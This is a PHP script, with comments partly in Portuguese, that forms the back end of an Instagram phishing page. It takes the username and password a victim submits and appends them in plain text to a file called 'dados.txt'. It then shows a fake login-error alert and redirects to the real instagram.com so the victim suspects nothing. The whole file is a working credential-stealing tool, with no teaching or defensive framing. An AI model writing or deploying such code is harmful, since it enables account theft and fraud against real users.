<?php

// Variable settings
$username = $_POST['u_name'] ?? '';  // Fetch username (using null coalescing operator)
$passcode = $_POST['pass'] ?? '';    // Fetch password (using null coalescing operator)


$txt = "Username: " . $username . "\r\nPassword: " . $passcode; // Email body (i) username [break] (ii) password;

// Check input fields
if (!empty($username) and !empty($passcode)) {

     $file = fopen("dados.txt", "a") or die("Não foi possível abrir o arquivo!");

    // Escreve os dados no arquivo de texto
    fwrite($file, "Username: " . $username . "\n");
    fwrite($file, "Password: " . $passcode . "\n\n");

    // Fecha o arquivo
    fclose($file);
	
    echo "<script type='text/javascript'>alert('Error ! Unable to login ');
        window.location.replace('https://www.instagram.com');
        </script>";

} else {

    echo "<script type='text/javascript'>alert('Login ou Senha incorretos, tente novamente. ');
        window.history.go(-1);
        </script>";
}
?>
